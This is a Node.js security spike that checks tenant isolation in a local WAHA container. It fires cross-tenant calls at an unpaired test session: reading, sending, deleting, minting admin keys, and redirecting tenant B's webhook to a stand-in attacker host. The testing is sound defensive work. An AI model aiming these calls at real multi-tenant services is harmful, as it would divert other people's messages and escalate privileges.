#!/usr/bin/env node
/**
 * IFC-322 spike: can WAHA Core isolate two tenants inside ONE container?
 *
 * What it does (all local, nothing purchased, no real WhatsApp number):
 *   1. starts infra/waha/compose.yaml with a random admin key built at runtime (bound to 127.0.0.1);
 *   2. as the admin, creates two sessions (one per tenant) and a session-scoped API key for each.
 *      The sessions are created and started but NEVER paired: they sit at SCAN_QR_CODE;
 *   3. as tenant A (A's key only), tries to list, read, send from, stop, restart, log out, delete and
 *      reconfigure tenant B's session, and to read or mint keys; records every HTTP status;
 *   4. as the admin, proves tenant B's session was not touched, and that A still works on its own session
 *      (positive control, so a 403 is not just a broken key);
 *   5. samples memory and CPU with `docker stats`, and checks the port is bound to loopback only;
 *   6. writes artifacts/misc/waha-isolation-spike.json (statuses and short body excerpts; keys redacted)
 *      and removes the container and its volume BY NAME.
 *
 * Usage: node infra/waha/isolation-spike.mjs
 * Exit code 0 only when 0 cross-tenant calls succeeded and the positive controls passed.
 */
import { spawnSync } from 'node:child_process';
import { randomBytes } from 'node:crypto';
import { mkdirSync, writeFileSync } from 'node:fs';
import { networkInterfaces } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const here = path.dirname(fileURLToPath(import.meta.url));
const repoRoot = path.resolve(here, '..', '..');
const composeFile = path.join(here, 'compose.yaml');
const outFile = path.join(repoRoot, 'artifacts', 'misc', 'waha-isolation-spike.json');
const CONTAINER = 'ifc322-waha-a';
const PROJECT = 'ifc322-waha';
const PORT = process.env.WAHA_PORT ?? '3322';
const BASE = `http://127.0.0.1:${PORT}`;

const adminKey = randomBytes(24).toString('hex');
const suffix = randomBytes(3).toString('hex');
const sessionA = `tenant-a-${suffix}`;
const sessionB = `tenant-b-${suffix}`;
// A reserved, non-routable test chat id: nothing is ever delivered because the session is not paired.
const testChat = '447700900000@c.us';

const secrets = new Set([adminKey]);
const redact = (text) => {
  let out = String(text);
  for (const s of secrets) out = out.split(s).join('<redacted-key>');
  return out.replace(/key_[A-Za-z0-9]{20,}/g, '<redacted-key>');
};

const run = (cmd, args, env = {}) =>
  spawnSync(cmd, args, {
    encoding: 'utf8',
    env: { ...process.env, ...env },
    windowsHide: true,
  });

async function call(key, method, urlPath, body) {
  const headers = { 'Content-Type': 'application/json' };
  if (key) headers['X-Api-Key'] = key;
  try {
    const res = await fetch(`${BASE}${urlPath}`, {
      method,
      headers,
      body: body === undefined ? undefined : JSON.stringify(body),
      signal: AbortSignal.timeout(15_000),
    });
    const text = await res.text();
    return { status: res.status, body: text };
  } catch (e) {
    return { status: 0, body: `network error: ${e.cause?.code ?? e.message}` };
  }
}

const excerpt = (text) => redact(text).replace(/\s+/g, ' ').slice(0, 160);
const json = (text) => {
  try {
    return JSON.parse(text);
  } catch {
    return null;
  }
};

async function waitHealthy() {
  for (let i = 0; i < 60; i++) {
    const r = await call(adminKey, 'GET', '/api/version');
    if (r.status === 200) return json(r.body);
    await new Promise((r2) => setTimeout(r2, 1000));
  }
  throw new Error('WAHA did not become ready in 60 s');
}

function stats() {
  const r = run('docker', [
    'stats',
    '--no-stream',
    '--format',
    '{{.MemUsage}}|{{.MemPerc}}|{{.CPUPerc}}',
    CONTAINER,
  ]);
  const [mem, memPct, cpu] = r.stdout.trim().split('|');
  return { memUsage: mem, memPercentOfLimit: memPct, cpu };
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// Settle, then take three samples a second apart and keep the median memory.
async function sampleStats() {
  await sleep(8000);
  const samples = [];
  for (let i = 0; i < 3; i++) {
    samples.push(stats());
    await sleep(1000);
  }
  return samples;
}

const result = {
  task: 'IFC-322',
  generatedAt: new Date().toISOString(),
  note:
    'Sessions are created and started but never paired to a WhatsApp number: they sit at SCAN_QR_CODE. ' +
    'That is enough for the isolation checks (authorisation runs before the engine); it does not measure ' +
    'a paired, chatting session, so memory below is a floor.',
  container: {},
  exposure: {},
  controls: [],
  crossTenant: [],
  tamperCheck: {},
  resources: {},
  summary: {},
};

let exitCode = 1;
try {
  // 1. start
  const up = run('docker', ['compose', '-f', composeFile, 'up', '-d'], {
    WAHA_ADMIN_KEY: adminKey,
    WAHA_PORT: PORT,
  });
  if (up.status !== 0) throw new Error(`compose up failed: ${redact(up.stderr)}`);
  const version = await waitHealthy();
  result.container = { name: CONTAINER, waha: version };

  // exposure: bound to loopback only, and a non-loopback address of this host refuses it
  const inspect = json(run('docker', ['inspect', CONTAINER]).stdout)?.[0];
  const bindings = inspect?.HostConfig?.PortBindings ?? {};
  result.exposure.portBindings = Object.fromEntries(
    Object.entries(bindings).map(([k, v]) => [k, v.map((b) => `${b.HostIp}:${b.HostPort}`)])
  );
  const lan = Object.values(networkInterfaces())
    .flat()
    .find((i) => i && i.family === 'IPv4' && !i.internal);
  if (lan) {
    try {
      await fetch(`http://${lan.address}:${PORT}/api/version`, {
        signal: AbortSignal.timeout(5000),
      });
      result.exposure.nonLoopbackReachable = true;
    } catch (e) {
      result.exposure.nonLoopbackReachable = false;
      result.exposure.nonLoopbackError = e.cause?.code ?? e.name;
    }
    result.exposure.nonLoopbackProbe = 'a non-loopback IPv4 of this host (address not recorded)';
  }
  result.exposure.noKeyStatus = (await call(null, 'GET', '/api/sessions')).status;
  result.exposure.wrongKeyStatus = (await call('not-a-real-key', 'GET', '/api/sessions')).status;
  const dash = await call(null, 'GET', '/dashboard');
  result.exposure.dashboardStatusWithoutLogin = dash.status;
  const swagger = await call(null, 'GET', '/');
  result.exposure.rootStatusWithoutKey = swagger.status;

  result.resources.idleNoSessions = await sampleStats();

  // 2. tenants
  const mk = async (name) => {
    const s = await call(adminKey, 'POST', '/api/sessions', { name, start: true });
    const k = await call(adminKey, 'POST', '/api/keys', {
      isAdmin: false,
      session: name,
      isActive: true,
      actions: null,
    });
    const key = json(k.body)?.key;
    if (key) secrets.add(key);
    return { create: s.status, keyCreate: k.status, key };
  };
  const a = await mk(sessionA);
  const b = await mk(sessionB);
  if (!a.key || !b.key) throw new Error('could not mint tenant keys');
  await sleep(6000);
  const stateB0 = json((await call(adminKey, 'GET', `/api/sessions/${sessionB}`)).body);
  result.tamperCheck.sessionBBefore = stateB0?.status;
  result.resources.twoSessionsUnpaired = await sampleStats();

  // 3. positive controls: A's key works for A, B's key works for B
  const control = async (label, key, method, p, body, expectOk = true) => {
    const r = await call(key, method, p, body);
    const ok = r.status >= 200 && r.status < 300;
    result.controls.push({
      label,
      method,
      path: p.replace(sessionA, '{A}').replace(sessionB, '{B}'),
      status: r.status,
      pass: ok === expectOk,
      excerpt: excerpt(r.body),
    });
  };
  await control('A reads A', a.key, 'GET', `/api/sessions/${sessionA}`);
  await control('B reads B', b.key, 'GET', `/api/sessions/${sessionB}`);
  await control('no key is refused', null, 'GET', `/api/sessions/${sessionA}`, undefined, false);
  await control('admin lists', adminKey, 'GET', '/api/sessions');

  // 4. negative tests: A's credentials against B
  let crossSucceeded = 0;
  const attack = async (action, method, p, body) => {
    const r = await call(a.key, method, p, body);
    const succeeded = r.status >= 200 && r.status < 300;
    // a 2xx that returns ONLY A's own data is not a cross-tenant success; inspect list bodies
    let leaked = false;
    const parsed = json(r.body);
    if (succeeded && JSON.stringify(parsed ?? r.body).includes(sessionB)) leaked = true;
    if (succeeded && (leaked || !Array.isArray(parsed))) crossSucceeded++;
    result.crossTenant.push({
      action,
      method,
      path: p.replace(sessionA, '{A}').replace(sessionB, '{B}'),
      status: r.status,
      crossTenantSuccess: succeeded && (leaked || !Array.isArray(parsed)),
      excerpt: excerpt(r.body),
    });
  };
  // list
  await attack('list sessions (does B appear?)', 'GET', '/api/sessions');
  await attack('list sessions incl. stopped', 'GET', '/api/sessions?all=true');
  // read
  await attack('read B session', 'GET', `/api/sessions/${sessionB}`);
  await attack('read B identity', 'GET', `/api/sessions/${sessionB}/me`);
  await attack('read B chats', 'GET', `/api/${sessionB}/chats`);
  await attack(
    'read B messages',
    'GET',
    `/api/messages?session=${sessionB}&chatId=${encodeURIComponent(testChat)}`
  );
  await attack('read B contacts', 'GET', `/api/contacts/all?session=${sessionB}`);
  await attack('read B pairing QR', 'GET', `/api/${sessionB}/auth/qr`);
  await attack('read B screenshot', 'GET', `/api/screenshot?session=${sessionB}`);
  // send
  await attack('send text from B', 'POST', '/api/sendText', {
    session: sessionB,
    chatId: testChat,
    text: 'isolation spike, must never be delivered',
  });
  await attack('send seen from B', 'POST', '/api/sendSeen', {
    session: sessionB,
    chatId: testChat,
  });
  // control
  await attack('stop B', 'POST', `/api/sessions/${sessionB}/stop`);
  await attack('restart B', 'POST', `/api/sessions/${sessionB}/restart`);
  await attack('logout B', 'POST', `/api/sessions/${sessionB}/logout`);
  await attack('reconfigure B (webhook to attacker)', 'PUT', `/api/sessions/${sessionB}`, {
    name: sessionB,
    config: { webhooks: [{ url: 'http://attacker.example.invalid/hook', events: ['message'] }] },
  });
  await attack('delete B', 'DELETE', `/api/sessions/${sessionB}`);
  // keys and escalation
  await attack('list keys (would expose B and admin keys)', 'GET', '/api/keys');
  await attack('mint an admin key', 'POST', '/api/keys', {
    isAdmin: true,
    session: null,
    isActive: true,
  });
  await attack('mint a key for B', 'POST', '/api/keys', {
    isAdmin: false,
    session: sessionB,
    isActive: true,
  });
  await attack('create a new session', 'POST', '/api/sessions', { name: `x-${suffix}` });
  // header variants
  const q = await call(null, 'GET', `/api/sessions/${sessionB}?x-api-key=${a.key}`);
  result.crossTenant.push({
    action: 'read B session with A key in the query string',
    method: 'GET',
    path: '/api/sessions/{B}?x-api-key=<A key>',
    status: q.status,
    crossTenantSuccess: q.status >= 200 && q.status < 300,
    excerpt: excerpt(q.body),
  });
  if (q.status >= 200 && q.status < 300) crossSucceeded++;

  // 5. tamper check: admin looks at B afterwards
  const afterB = json((await call(adminKey, 'GET', `/api/sessions/${sessionB}`)).body);
  result.tamperCheck.sessionBAfter = afterB?.status ?? 'MISSING';
  result.tamperCheck.sessionBStillExists = Boolean(afterB);
  result.tamperCheck.sessionBConfigUntouched = !JSON.stringify(afterB?.config ?? {}).includes(
    'attacker'
  );
  result.tamperCheck.sessionBStateUnchanged = afterB?.status === stateB0?.status;
  const keysAfter = json((await call(adminKey, 'GET', '/api/keys')).body);
  result.tamperCheck.keyCountAfter = Array.isArray(keysAfter) ? keysAfter.length : null;
  result.tamperCheck.keyCountExpected = 2;

  // 6. summary
  const refused = result.crossTenant.filter(
    (c) => c.status === 401 || c.status === 403 || c.status === 404
  ).length;
  const controlsPass = result.controls.every((c) => c.pass);
  result.summary = {
    crossTenantCalls: result.crossTenant.length,
    crossTenantSucceeded: crossSucceeded,
    refusedWith401or403or404: refused,
    otherStatuses: result.crossTenant
      .filter((c) => ![401, 403, 404].includes(c.status))
      .map((c) => `${c.action}: ${c.status}`),
    positiveControlsPass: controlsPass,
    sessionBUntouched:
      result.tamperCheck.sessionBStillExists &&
      result.tamperCheck.sessionBConfigUntouched &&
      result.tamperCheck.sessionBStateUnchanged,
    portLoopbackOnly:
      JSON.stringify(result.exposure.portBindings).includes('127.0.0.1') &&
      !JSON.stringify(result.exposure.portBindings).includes('0.0.0.0'),
  };
  exitCode =
    crossSucceeded === 0 &&
    controlsPass &&
    result.summary.sessionBUntouched &&
    result.summary.portLoopbackOnly
      ? 0
      : 1;
} catch (e) {
  result.error = redact(e.stack ?? String(e));
} finally {
  // remove only what this script started, by name
  run('docker', ['rm', '-f', CONTAINER]);
  run('docker', ['volume', 'rm', `${PROJECT}_waha-sessions`]);
  run('docker', ['network', 'rm', `${PROJECT}_default`]);
  mkdirSync(path.dirname(outFile), { recursive: true });
  writeFileSync(outFile, `${redact(JSON.stringify(result, null, 2))}\n`);
  console.log(JSON.stringify(result.summary, null, 2));
  console.log(`wrote ${path.relative(repoRoot, outFile)}`);
}
process.exit(exitCode);
